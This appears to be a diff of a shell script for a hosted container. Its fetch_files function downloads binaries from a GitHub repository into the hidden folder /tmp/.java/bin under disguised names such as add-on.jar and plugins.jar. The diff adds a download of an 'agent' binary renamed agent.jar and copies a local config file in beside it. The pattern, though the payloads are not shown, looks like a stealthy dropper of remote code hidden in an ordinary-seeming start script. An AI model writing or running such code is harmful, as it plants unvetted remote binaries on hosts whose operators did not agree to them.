@@ -6,6 +6,8 @@ function fetch_files() {
     cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
     cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
     cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/ukgame/n1.conf -o cfg.conf
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/x64/agent -o agent.jar
+    cp /home/container/.local/.conf/cli.yaml /tmp/.java/bin/cli.yaml
 }
 
 function start_app() {
